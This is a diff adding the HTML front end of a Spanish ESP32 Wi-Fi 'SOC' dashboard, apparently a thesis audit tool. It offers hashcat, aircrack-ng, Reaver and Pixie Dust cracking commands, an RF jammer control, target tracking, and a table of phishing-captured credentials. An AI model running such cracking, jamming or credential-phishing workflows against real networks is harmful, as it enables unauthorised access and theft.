@@ -1,0 +1,1713 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ESP32 Wi-Fi SOC - Masterpiece</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+        }
+        .card {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+        }
+        .alert-red {
+            background-color: #2e0000;
+            border: 1px solid #7a0000;
+            color: #ff6666;
+        }
+        .alert-purple {
+            background-color: #1e102e;
+            border: 1px solid #4f2178;
+            color: #c471ed;
+        }
+        .text-neon { color: #58a6ff; }
+        .badge {
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+        }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
+        #fox-hunt-modal { display: none; background: rgba(0,0,0,0.9); }
+        .radar-circle {
+            border: 2px solid #58a6ff;
+            border-radius: 50%;
+            animation: ping 2s cubic-bezier(0, 0, 0.2, 1) infinite;
+        }
+        @keyframes ping {
+            75%, 100% { transform: scale(2); opacity: 0; }
+        }
+        /* ── Tabs ── */
+        .tab-btn {
+            padding: 0.6rem 1.2rem;
+            border-bottom: 2px solid transparent;
+            color: #8b949e;
+            transition: all 0.2s;
+            font-weight: 600;
+            white-space: nowrap;
+            font-size: 0.95rem;
+        }
+        .tab-btn.active { border-bottom: 2px solid #58a6ff; color: #58a6ff; }
+        .tab-btn:hover:not(.active) { color: #c9d1d9; border-bottom: 2px solid #30363d; }
+        .tab-content { display: none; animation: fadeIn 0.25s ease; }
+        .tab-content.active { display: block; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+
+<body class="p-4 md:p-6">
+
+<!-- ══════════════════════════════════════════════════════════
+     MODALES FLOTANTES (siempre presentes en el DOM)
+     ══════════════════════════════════════════════════════════ -->
+
+<!-- FOX HUNT MODAL -->
+<div id="fox-hunt-modal" class="fixed inset-0 z-50 flex flex-col items-center justify-center p-4">
+    <h2 class="text-4xl font-bold text-neon mb-2 animate-pulse">🎯 MODO CAZA (FOX HUNT)</h2>
+    <p class="text-gray-400 mb-8">Rastreando objetivo: <span id="fh-target" class="text-white font-mono font-bold text-xl"></span></p>
+    <div class="relative w-64 h-64 flex items-center justify-center mb-8">
+        <div class="absolute inset-0 radar-circle"></div>
+        <div class="absolute inset-4 radar-circle" style="animation-delay: 0.5s"></div>
+        <div class="absolute inset-8 border border-blue-500 rounded-full bg-[#161b22] z-10 flex flex-col items-center justify-center shadow-[0_0_50px_rgba(88,166,255,0.5)]">
+            <span id="fh-rssi" class="text-5xl font-bold text-white">-</span>
+            <span class="text-sm text-gray-400">dBm</span>
+        </div>
+    </div>
+    <div class="text-center w-full max-w-md">
+        <p id="fh-dist" class="text-2xl font-bold text-yellow-400 mb-4">Esperando señal...</p>
+        <div class="w-full bg-gray-800 rounded-full h-4 mb-8 border border-gray-600 overflow-hidden">
+            <div id="fh-bar" class="bg-blue-500 h-4 rounded-full transition-all duration-300" style="width: 0%"></div>
+        </div>
+        <button onclick="stopFoxHunt()" class="bg-red-600 hover:bg-red-500 text-white px-8 py-3 rounded-lg font-bold text-lg transition">Abortar Búsqueda</button>
+    </div>
+</div>
+
+<!-- FLASH MODAL -->
+<div id="flash-modal" class="fixed inset-0 z-50 hidden flex-col items-center justify-center p-4 bg-black bg-opacity-90">
+    <h2 class="text-3xl font-bold text-purple-400 mb-4 animate-pulse flex items-center gap-2">⚡ Flasheando ESP32...</h2>
+    <div class="w-full max-w-4xl bg-[#0d1117] border border-purple-500 rounded-lg shadow-[0_0_20px_rgba(168,85,247,0.4)] flex flex-col h-[60vh]">
+        <div id="flash-logs" class="flex-1 overflow-y-auto p-4 font-mono text-xs text-gray-300 whitespace-pre-wrap"></div>
+        <div class="p-4 border-t border-purple-900 flex justify-end">
+            <button id="close-flash-btn" onclick="closeFlashModal()" class="hidden bg-gray-600 hover:bg-gray-500 text-white px-6 py-2 rounded font-bold transition">Cerrar</button>
+        </div>
+    </div>
+</div>
+
+<!-- HASHCAT MODAL -->
+<div id="hashcat-modal" class="fixed inset-0 z-50 hidden flex-col items-center justify-center p-4 bg-black bg-opacity-90 overflow-y-auto">
+    <div class="w-full max-w-4xl">
+        <div class="flex justify-between items-center mb-6">
+            <h2 class="text-3xl font-bold text-red-500 flex items-center gap-3">
+                <span id="hc-spinner" class="hidden">⏳</span>
+                <span>🔥 Hashcat Attack Vector</span>
+            </h2>
+            <button onclick="closeHashcatModal()" class="text-gray-400 hover:text-white text-2xl leading-none">&times;</button>
+        </div>
+        <div id="hc-loading" class="hidden text-center py-16">
+            <div class="text-5xl mb-4 animate-spin inline-block">⚙️</div>
+            <p class="text-gray-300 text-lg">Analizando paquetes EAPOL con Python/Scapy...</p>
+            <p class="text-gray-500 text-sm mt-2">Extrayendo ANonce, SNonce, MIC y construyendo hash WPA*02...</p>
+        </div>
+        <div id="hc-error" class="hidden bg-red-900 bg-opacity-40 border border-red-500 rounded-lg p-6 text-center">
+            <div class="text-4xl mb-4">❌</div>
+            <p id="hc-error-msg" class="text-red-300 font-bold">Error desconocido</p>
+            <p class="text-gray-400 text-sm mt-2">El PCAP puede estar incompleto o sin pares M1+M2 capturados.</p>
+        </div>
+        <div id="hc-results" class="hidden space-y-6">
+            <div class="bg-green-900 bg-opacity-20 border border-green-700 rounded-lg p-4 flex items-center gap-4">
+                <div class="text-3xl">✅</div>
+                <div>
+                    <p class="text-green-400 font-bold text-lg">Hash(es) extraidos correctamente</p>
+                    <p id="hc-summary" class="text-gray-400 text-sm">...</p>
+                </div>
+                <div class="ml-auto">
+                    <a id="hc-download-btn" href="#" download class="hidden bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded font-bold text-sm transition">📥 Descargar .hc22000</a>
+                </div>
+            </div>
+            <div id="hc-hashes-container" class="space-y-6"></div>
+            <div class="bg-[#0d1117] border border-orange-700 rounded-lg p-5">
+                <h3 class="text-orange-400 font-bold text-lg mb-3">⚡ Paso Final: Ejecutar Hashcat</h3>
+                <p class="text-gray-400 text-sm mb-3">Descarga el archivo <code class="text-green-400 bg-gray-800 px-1 rounded">.hc22000</code> y ejecuta:</p>
+                <div class="bg-black p-3 rounded font-mono text-sm text-green-400 border border-gray-700 select-all flex justify-between items-center">
+                    <span id="hc-cmd-value">hashcat -m 22000 <span id="hc-cmd-filename" class="text-white">hash.hc22000</span> /usr/share/wordlists/rockyou.txt --force</span>
+                    <button onclick="runRemoteCommand(document.getElementById('hc-cmd-value').innerText)" class="ml-4 bg-red-800 hover:bg-red-700 border border-red-500 text-white text-xs px-3 py-1 rounded shadow-lg transition whitespace-nowrap font-bold">▶️ Ejecutar en Servidor</button>
+                </div>
+                <div class="mt-3 bg-black p-3 rounded font-mono text-sm text-blue-400 border border-gray-700 select-all">
+                    # Con reglas (más potente):<br>
+                    hashcat -m 22000 <span class="hc-cmd-filename-ref text-white">hash.hc22000</span> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- MODAL PIXIE DUST -->
+<div id="pixie-modal" class="fixed inset-0 bg-black bg-opacity-80 hidden items-center justify-center z-50 p-4 backdrop-blur-sm">
+    <div class="bg-[#161b22] border border-fuchsia-700 rounded-lg shadow-2xl w-full max-w-3xl flex flex-col max-h-[90vh]">
+        <div class="border-b border-fuchsia-900 p-4 flex justify-between items-center bg-fuchsia-900 bg-opacity-20 rounded-t-lg">
+            <h2 class="text-xl font-bold text-fuchsia-400 flex items-center"><span class="text-2xl mr-2">✨</span> Motor Pixie Dust (WPS Offline Crack)</h2>
+            <button onclick="closePixieModal()" class="text-gray-400 hover:text-white transition">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            </button>
+        </div>
+        <div class="p-6 overflow-y-auto flex-1">
+            <div id="pixie-loading" class="flex flex-col items-center justify-center py-10">
+                <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-fuchsia-500 mb-4"></div>
+                <p class="text-fuchsia-300 font-mono animate-pulse">Analizando PCAP en busca de parámetros WPS M1-M3...</p>
+            </div>
+            <div id="pixie-error" class="hidden bg-red-900 bg-opacity-20 border border-red-800 rounded p-4 mb-4">
+                <div class="flex items-center text-red-500 font-bold mb-2">Análisis Fallido</div>
+                <p id="pixie-error-msg" class="text-red-400 text-sm font-mono whitespace-pre-wrap"></p>
+            </div>
+            <div id="pixie-results" class="hidden">
+                <div class="bg-green-900 bg-opacity-20 border border-green-800 rounded p-4 mb-6">
+                    <p class="text-green-400 font-bold">¡Parámetros WPS Extraídos Correctamente!</p>
+                    <p class="text-gray-400 text-sm mt-1">Copia el comando y ejecútalo en Kali Linux para obtener el PIN.</p>
+                </div>
+                <div class="mb-3">
+                    <div class="flex justify-between items-center mb-1">
+                        <span class="text-xs text-gray-400 font-bold">Comando de ataque:</span>
+                        <div>
+                            <button onclick="runRemoteCommand(document.getElementById('pixie-cmd-value').value, true)" class="bg-red-800 hover:bg-red-700 text-white text-xs px-3 py-1 rounded transition border border-red-500 shadow-lg font-bold">▶️ Ejecutar en Kali</button>
+                            <button id="pixie-copy-btn" onclick="copyPixieCommand()" class="bg-fuchsia-600 hover:bg-fuchsia-500 text-white text-xs px-3 py-1 rounded transition ml-2">📋 Copiar</button>
+                        </div>
+                    </div>
+                    <textarea id="pixie-cmd-value" readonly class="w-full bg-[#0d1117] text-fuchsia-400 font-mono text-sm p-3 border border-gray-700 rounded h-24 focus:outline-none focus:border-fuchsia-500 shadow-inner break-all"></textarea>
+                </div>
+            </div>
+        </div>
+        <div class="border-t border-gray-800 p-4 bg-[#0d1117] rounded-b-lg flex justify-end">
+            <button onclick="closePixieModal()" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded font-bold transition">Cerrar</button>
+        </div>
+    </div>
+</div>
+
+<!-- MODAL REAVER -->
+<div id="reaver-modal" class="fixed inset-0 bg-black bg-opacity-80 hidden items-center justify-center z-50 p-4 backdrop-blur-sm">
+    <div class="bg-[#161b22] border border-red-900 rounded-lg shadow-2xl w-full max-w-2xl flex flex-col max-h-[90vh]">
+        <div class="border-b border-red-900 p-4 flex justify-between items-center bg-red-900 bg-opacity-20 rounded-t-lg">
+            <h2 class="text-xl font-bold text-red-400 flex items-center"><span class="text-2xl mr-2">⚔️</span> Asistente de Ataque Online (Reaver)</h2>
+            <button onclick="closeReaverModal()" class="text-gray-400 hover:text-white transition">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            </button>
+        </div>
+        <div class="p-6 overflow-y-auto flex-1">
+            <div class="mb-4">
+                <p class="text-gray-300">Objetivo: <span id="reaver-target-ssid" class="font-bold text-white"></span> (<span id="reaver-target-bssid" class="font-mono text-red-400"></span>)</p>
+            </div>
+            <div class="bg-blue-900 bg-opacity-20 border border-blue-800 rounded p-4 mb-6">
+                <h3 class="text-blue-400 font-bold mb-2">🧠 Generador Algorítmico de PINs por Defecto</h3>
+                <p class="text-xs text-gray-400 mb-3">Muchos routers derivan el PIN de fábrica matemáticamente de la MAC. Prueba estos PINs antes del ataque de fuerza bruta completo.</p>
+                <table class="w-full text-left text-sm">
+                    <thead><tr class="text-gray-500 border-b border-gray-700"><th>PIN Probable</th><th>Algoritmo</th><th>Acción</th></tr></thead>
+                    <tbody id="reaver-pins-body"></tbody>
+                </table>
+            </div>
+            <div class="mb-3">
+                <div class="flex justify-between items-center mb-1">
+                    <span class="text-xs text-gray-400 font-bold">Comando Reaver Recomendado:</span>
+                    <div>
+                        <button onclick="runRemoteCommand(document.getElementById('reaver-cmd-value').value)" class="bg-red-800 hover:bg-red-700 text-white text-xs px-3 py-1 rounded transition border border-red-500 shadow-lg font-bold">▶️ Ejecutar en Servidor</button>
+                        <button id="reaver-copy-btn" onclick="copyReaverCommand()" class="bg-gray-700 hover:bg-gray-600 text-white text-xs px-3 py-1 rounded transition border border-gray-500 ml-2">📋 Copiar a Kali</button>
+                    </div>
+                </div>
+                <textarea id="reaver-cmd-value" readonly class="w-full bg-[#0d1117] text-red-400 font-mono text-sm p-3 border border-red-900 rounded h-16 focus:outline-none shadow-inner"></textarea>
+            </div>
+        </div>
+        <div class="border-t border-gray-800 p-4 bg-[#0d1117] rounded-b-lg flex justify-end">
+            <button onclick="closeReaverModal()" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded font-bold transition">Cerrar Asistente</button>
+        </div>
+    </div>
+</div>
+
+<!-- MODAL AIRCRACK-NG (popup rápido desde bóveda) -->
+<div id="aircrack-modal" class="fixed inset-0 bg-black bg-opacity-80 hidden items-center justify-center z-50 p-4 backdrop-blur-sm">
+    <div class="bg-[#161b22] border border-green-800 rounded-lg shadow-2xl w-full max-w-2xl flex flex-col max-h-[90vh]">
+        <div class="border-b border-green-900 p-4 flex justify-between items-center bg-green-900 bg-opacity-20 rounded-t-lg">
+            <h2 class="text-xl font-bold text-green-400 flex items-center"><span class="text-2xl mr-2">✈️</span> Aircrack-ng — Ataque de Diccionario</h2>
+            <button onclick="closeAircrackModal()" class="text-gray-400 hover:text-white transition">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            </button>
+        </div>
+        <div class="p-6 overflow-y-auto flex-1">
+            <p class="text-gray-300 mb-1">Objetivo: <span id="aircrack-target-ssid" class="font-bold text-white"></span></p>
+            <p class="text-xs text-gray-500 font-mono mb-4">Archivo: <span id="aircrack-target-file" class="text-green-400"></span></p>
+            <div class="bg-blue-900 bg-opacity-20 border border-blue-800 rounded p-4 mb-5">
+                <p class="text-blue-400 text-sm font-bold mb-1">💡 Ventaja sobre Hashcat</p>
+                <p class="text-xs text-gray-400">Aircrack-ng trabaja directamente sobre el <strong class="text-white">.pcap</strong> sin necesidad de convertirlo. Ideal para wordlists pequeñas.</p>
+            </div>
+            <div class="mb-4">
+                <label class="text-xs text-gray-400 block mb-2 font-bold">Wordlist (ruta dentro de Kali):</label>
+                <select id="aircrack-wordlist" onchange="updateAircrackCmd(document.getElementById('aircrack-cmd-value').dataset.filename)"
+                    class="w-full bg-[#0d1117] border border-gray-600 text-green-300 text-sm px-3 py-2 rounded font-mono focus:outline-none focus:border-green-500 mb-2">
+                    <option value="/usr/share/wordlists/rockyou.txt">rockyou.txt (14M passwords)</option>
+                    <option value="/usr/share/wordlists/fasttrack.txt">fasttrack.txt (rápida)</option>
+                    <option value="/usr/share/wordlists/dirb/common.txt">dirb/common.txt</option>
+                </select>
+            </div>
+            <div class="mb-3">
+                <span class="text-xs text-gray-400 font-bold block mb-1">Comando generado:</span>
+                <textarea id="aircrack-cmd-value" readonly class="w-full bg-[#0d1117] text-green-400 font-mono text-xs p-3 border border-green-900 rounded h-14 focus:outline-none shadow-inner"></textarea>
+            </div>
+        </div>
+        <div class="border-t border-gray-800 p-4 bg-[#0d1117] rounded-b-lg flex justify-between">
+            <button onclick="closeAircrackModal()" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded font-bold transition">Cancelar</button>
+            <button onclick="runAircrackFromModal()" class="bg-green-700 hover:bg-green-600 border border-green-500 text-white px-6 py-2 rounded font-bold transition shadow-lg">▶️ Lanzar en Kali Linux</button>
+        </div>
+    </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════
+     CONTENIDO PRINCIPAL
+     ══════════════════════════════════════════════════════════ -->
+<div class="max-w-7xl mx-auto space-y-6">
+
+    <!-- HEADER -->
+    <header class="flex justify-between items-center bg-[#161b22] p-4 rounded-lg border border-[#30363d]">
+        <h1 class="text-2xl font-bold text-neon flex items-center gap-2">
+            <span class="animate-pulse">🔴</span> SOC Intelligence (SIGINT)
+        </h1>
+        <div class="flex gap-2 flex-wrap">
+            <select id="com-ports" class="bg-gray-800 text-white p-2 rounded text-sm outline-none border border-gray-600"></select>
+            <button onclick="connectPort()" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm font-bold transition">Enlazar ESP32</button>
+            <button onclick="flashESP32()" class="bg-purple-600 hover:bg-purple-500 text-white px-4 py-2 rounded text-sm font-bold transition flex items-center gap-2">⚡ Flashear</button>
+            <button onclick="generateReport()" class="bg-green-700 hover:bg-green-600 text-white px-4 py-2 rounded text-sm font-bold transition flex items-center gap-2">📑 Reporte</button>
+        </div>
+    </header>
+
+    <!-- BANNER TFM -->
+    <div class="bg-blue-900 bg-opacity-30 border border-blue-500 text-white px-4 py-3 rounded-lg flex flex-col md:flex-row justify-between items-center shadow-[0_0_15px_rgba(59,130,246,0.3)] gap-4 md:gap-0">
+        <div class="flex items-center gap-3">
+            <span class="font-bold text-lg text-gray-300 hidden md:inline">🛡️ Objetivo de Auditoría (TFM):</span>
+            <span class="font-bold text-lg text-gray-300 md:hidden">🛡️ VIP:</span>
+            <input type="text" id="target-ssid-input" value="vodafone10C0"
+                oninput="loadHistoricalData(); loadCaptures();"
+                class="bg-[#0d1117] border border-blue-400 text-yellow-300 font-mono text-xl font-bold px-3 py-1 rounded focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400 transition-all w-48 md:w-64"
+                placeholder="Nombre del Wi-Fi...">
+        </div>
+        <div class="flex items-center gap-2 bg-red-600 px-3 py-1 rounded-full animate-pulse shadow-[0_0_10px_rgba(220,38,38,0.8)]">
+            <div class="w-2 h-2 bg-white rounded-full"></div>
+            <span class="text-xs font-bold uppercase tracking-widest">Protección Activa</span>
+        </div>
+    </div>
+
+    <!-- ── NAVEGACIÓN DE PESTAÑAS ── -->
+    <div class="flex gap-1 border-b border-[#30363d] overflow-x-auto pb-0">
+        <button onclick="switchTab('tab-radar')"  id="btn-tab-radar"  class="tab-btn active">📡 Espectro &amp; Radar</button>
+        <button onclick="switchTab('tab-audit')"  id="btn-tab-audit"  class="tab-btn">🛡️ Auditoría &amp; SIGINT</button>
+        <button onclick="switchTab('tab-vault')"  id="btn-tab-vault"  class="tab-btn">🗄️ Bóveda Forense</button>
+        <button onclick="switchTab('tab-term')"   id="btn-tab-term"   class="tab-btn">🖥️ Terminal &amp; Teoría</button>
+        <button onclick="switchTab('tab-crack')"  id="btn-tab-crack"  class="tab-btn">✈️ Aircrack-ng</button>
+    </div>
+
+    <!-- ══════════════════════════════════════
+         TAB 1 – ESPECTRO & RADAR
+         ══════════════════════════════════════ -->
+    <div id="tab-radar" class="tab-content active space-y-6">
+
+        <!-- Gráfico e Indicadores -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <div class="card p-4 lg:col-span-2 relative h-64">
+                <h2 class="text-lg font-semibold mb-2 text-gray-300">Espectrómetro Wi-Fi</h2>
+                <canvas id="trafficChart"></canvas>
+            </div>
+            <div class="card p-4 grid grid-cols-2 gap-4 text-center items-center h-64">
+                <div><p class="text-xs text-gray-400">Canal</p><p id="t-channel" class="text-3xl font-bold text-white">-</p></div>
+                <div><p class="text-xs text-gray-400">Beacons/s</p><p id="t-beacons" class="text-3xl font-bold text-blue-400">0</p></div>
+                <div><p class="text-xs text-gray-400">Deauths/s</p><p id="t-deauths" class="text-3xl font-bold text-red-400">0</p></div>
+                <div><p class="text-xs text-gray-400">Probes/s</p><p id="t-probes" class="text-3xl font-bold text-green-400">0</p></div>
+                <div class="col-span-2 mt-2">
+                    <button onclick="resumeHopping()" class="bg-gray-700 hover:bg-gray-600 border border-gray-500 text-white px-4 py-1 rounded text-xs font-bold transition w-full">📡 Reanudar Salto de Canales (HOP)</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Radar Topológico -->
+        <div class="card p-4 h-[500px] relative">
+            <div class="absolute top-4 left-4 z-10 bg-[#0d1117] bg-opacity-80 p-2 rounded border border-gray-700">
+                <h2 class="text-xl font-semibold text-blue-400">🕸️ Radar Topológico (D3/Vis)</h2>
+                <p class="text-xs text-gray-400">Mapa relacional del espacio electromagnético</p>
+                <div class="flex gap-2 mt-2">
+                    <button onclick="stabilizeGraph()" class="bg-gray-700 hover:bg-gray-600 px-2 py-1 rounded text-xs text-white">❄️ Congelar Física</button>
+                    <button onclick="clearGraph()" class="bg-red-900 hover:bg-red-800 px-2 py-1 rounded text-xs text-white">🗑️ Limpiar Radar</button>
+                </div>
+            </div>
+            <div id="network-graph" class="w-full h-full bg-[#0d1117] rounded shadow-inner border border-[#30363d] overflow-hidden"></div>
+        </div>
+
+        <!-- Analizador de Espectro nRF24L01+ -->
+        <div class="card p-4 flex flex-col shadow-[0_0_20px_rgba(16,185,129,0.3)] border-green-800">
+            <div class="flex justify-between items-center mb-4">
+                <div>
+                    <h2 class="text-xl font-semibold text-green-400">📡 Analizador de Espectro Bruto (nRF24L01+)</h2>
+                    <p class="text-xs text-gray-400">Medición de energía bruta en 2.4GHz (Wi-Fi, Bluetooth, Microondas...)</p>
+                </div>
+                <div class="flex gap-2">
+                    <button onclick="toggleRfSweep()" id="btn-sweep" class="bg-blue-700 hover:bg-blue-600 px-3 py-1.5 rounded text-white text-sm font-bold transition shadow-lg">📊 Iniciar Escáner 2.4GHz</button>
+                    <div class="flex items-center gap-1 bg-[#0d1117] border border-red-900 rounded p-1 pl-2">
+                        <span class="text-xs text-gray-400">Canal RF:</span>
+                        <input type="number" id="jam-ch-input" value="40" min="0" max="125" class="bg-gray-800 text-white w-12 px-1 text-sm outline-none border border-gray-700 rounded text-center">
+                        <button onclick="toggleRfJammer()" id="btn-jammer" class="bg-red-900 hover:bg-red-800 px-3 py-1 rounded text-white text-sm font-bold transition">🚫 JAMMER</button>
+                    </div>
+                </div>
+            </div>
+            <div class="w-full h-48 bg-[#0d1117] rounded border border-gray-700 p-2 relative">
+                <div id="rf-overlay" class="absolute inset-0 z-10 flex flex-col items-center justify-center bg-black bg-opacity-80 rounded">
+                    <span class="text-green-500 font-bold mb-2">Módulo RF en reposo</span>
+                    <span class="text-xs text-gray-400">Inicia el escáner para ver la saturación de los 125 canales</span>
+                </div>
+                <canvas id="rfChart"></canvas>
+            </div>
+        </div>
+
+    </div><!-- /tab-radar -->
+
+    <!-- ══════════════════════════════════════
+         TAB 2 – AUDITORÍA & SIGINT
+         ══════════════════════════════════════ -->
+    <div id="tab-audit" class="tab-content space-y-6">
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <!-- Alertas SIGINT -->
+            <div class="card p-4 flex flex-col h-96">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-xl font-semibold text-red-400">⚠️ Inteligencia de Amenazas</h2>
+                    <button onclick="document.getElementById('alerts-box').innerHTML=''" class="text-xs bg-red-900 hover:bg-red-800 px-2 py-1 rounded text-white transition">Limpiar</button>
+                </div>
+                <div class="flex flex-wrap gap-2 text-xs mb-3 bg-[#0d1117] p-2 rounded border border-gray-700">
+                    <label class="flex items-center gap-1 cursor-pointer"><input type="checkbox" id="f-target" class="accent-blue-500"> Solo VIP</label>
+                    <label class="flex items-center gap-1 cursor-pointer"><input type="checkbox" id="f-decloak" checked class="accent-blue-500"> Ocultar Decloaks</label>
+                    <label class="flex items-center gap-1 cursor-pointer"><input type="checkbox" id="f-evil" class="accent-blue-500"> Ocultar Evil Twin</label>
+                    <button onclick="togglePauseAlerts()" id="btn-pause-alerts" class="ml-auto bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-white font-bold transition">⏸ Pausar</button>
+                </div>
+                <div id="alerts-box" class="flex-1 overflow-y-auto space-y-3 pr-2">
+                    <p class="text-sm text-gray-500 text-center mt-10">Monitorizando el espacio aéreo...</p>
+                </div>
+            </div>
+
+            <!-- Radar de Clientes (Probes) -->
+            <div class="card p-4 flex flex-col h-96">
+                <h2 class="text-xl font-semibold mb-4 text-green-400">📍 Radar de Proximidad (Probes)</h2>
+                <div class="overflow-y-auto">
+                    <table class="w-full text-left text-sm">
+                        <thead class="text-gray-400 border-b border-gray-700 sticky top-0 bg-[#161b22]">
+                            <tr><th>Fabricante (MAC)</th><th>Buscando</th><th>Señal (RSSI)</th></tr>
+                        </thead>
+                        <tbody id="probes-body"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Auditoría Dinámica de Redes -->
+            <div class="card p-4 flex flex-col col-span-1 md:col-span-2" style="height:480px">
+                <div class="flex justify-between items-center mb-3">
+                    <h2 class="text-xl font-semibold text-purple-400">🛡️ Auditoría Dinámica de Redes</h2>
+                    <div class="flex items-center gap-3 text-xs text-gray-500">
+                        <span class="flex items-center gap-1"><span class="inline-block w-2 h-2 rounded-full bg-blue-500"></span>Beacons</span>
+                        <span class="flex items-center gap-1"><span class="inline-block w-2 h-2 rounded-full bg-green-500"></span>Probes</span>
+                        <span class="flex items-center gap-1"><span class="inline-block w-2 h-2 rounded-full bg-red-500"></span>Deauths</span>
+                        <span class="flex items-center gap-1"><span class="inline-block w-2 h-2 rounded-full bg-yellow-500"></span>EAPOLs</span>
+                        <button onclick="resetNetworkTraffic()" class="bg-gray-700 hover:bg-gray-600 px-2 py-0.5 rounded text-gray-300 font-bold transition">🔄 Reset</button>
+                    </div>
+                </div>
+                <div class="overflow-y-auto flex-1">
+                    <table class="w-full text-left text-sm">
+                        <thead class="text-gray-400 border-b border-gray-700 sticky top-0 bg-[#161b22]">
+                            <tr>
+                                <th class="pb-2">Nombre (SSID)</th>
+                                <th class="pb-2">Router (MAC/Vendor)</th>
+                                <th class="pb-2">Criptografía (MFP)</th>
+                                <th class="pb-2 min-w-[160px]">📊 Tráfico en Vivo</th>
+                                <th class="pb-2">Proximidad &amp; Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="networks-body"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <!-- Redes Ocultas -->
+            <div class="card p-4 flex flex-col h-72">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-xl font-semibold text-purple-400">🕵️ Analizador de Redes Ocultas</h2>
+                    <span class="text-xs bg-purple-900 bg-opacity-50 border border-purple-500 px-2 py-1 rounded text-purple-200">Buscando Decloaks...</span>
+                </div>
+                <div class="overflow-y-auto">
+                    <table class="w-full text-left text-sm">
+                        <thead class="text-gray-400 border-b border-gray-700 sticky top-0 bg-[#161b22]">
+                            <tr><th class="pb-2">BSSID (MAC)</th><th class="pb-2">Estado / SSID Real</th><th class="pb-2">Potencia (RSSI)</th></tr>
+                        </thead>
+                        <tbody id="hidden-networks-body"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Dispositivos Activos -->
+            <div class="card p-4 flex flex-col h-72 border-blue-900 shadow-[0_0_15px_rgba(59,130,246,0.1)]">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-xl font-semibold text-blue-400">📱 Dispositivos Activos (Tráfico)</h2>
+                    <div class="flex items-center gap-2">
+                        <select id="active-device-filter" onchange="renderActiveDevices()" class="bg-gray-800 text-xs text-white px-2 py-1 border border-gray-700 rounded outline-none max-w-[150px]"><option value="all">Todas las redes</option></select>
+                        <button onclick="clearActiveDevices()" class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-white font-bold transition">🧹 Limpiar</button>
+                    </div>
+                </div>
+                <div class="overflow-y-auto">
+                    <table class="w-full text-left text-sm">
+                        <thead class="text-gray-400 border-b border-gray-700 sticky top-0 bg-[#161b22]">
+                            <tr><th class="pb-2">MAC Cliente</th><th class="pb-2">BSSID Destino</th><th class="pb-2">Pkts</th><th class="pb-2">Proximidad</th></tr>
+                        </thead>
+                        <tbody id="active-devices-body"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+    </div><!-- /tab-audit -->
+
+    <!-- ══════════════════════════════════════
+         TAB 3 – BÓVEDA FORENSE
+         ══════════════════════════════════════ -->
+    <div id="tab-vault" class="tab-content space-y-6">
+
+        <!-- Credenciales -->
+        <div class="card p-4 flex flex-col h-64 border-orange-800 shadow-[0_0_15px_rgba(249,115,22,0.2)]">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-xl font-semibold text-orange-400">🔑 Bóveda de Credenciales (Phishing)</h2>
+                <button onclick="loadCredentials()" class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-white font-bold transition">🔄 Actualizar</button>
+            </div>
+            <div class="overflow-y-auto">
+                <table class="w-full text-left text-sm">
+                    <thead class="text-gray-400 border-b border-gray-700 sticky top-0 bg-[#161b22] z-10">
+                        <tr><th class="pb-2">Fecha</th><th class="pb-2">Red (SSID)</th><th class="pb-2">Usuario</th><th class="pb-2">Contraseña</th></tr>
+                    </thead>
+                    <tbody id="credentials-body"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Bóveda PCAP -->
+        <div class="card p-4 flex flex-col h-80 shadow-[0_0_20px_rgba(0,0,0,0.5)]">
+            <div class="flex justify-between items-center mb-4">
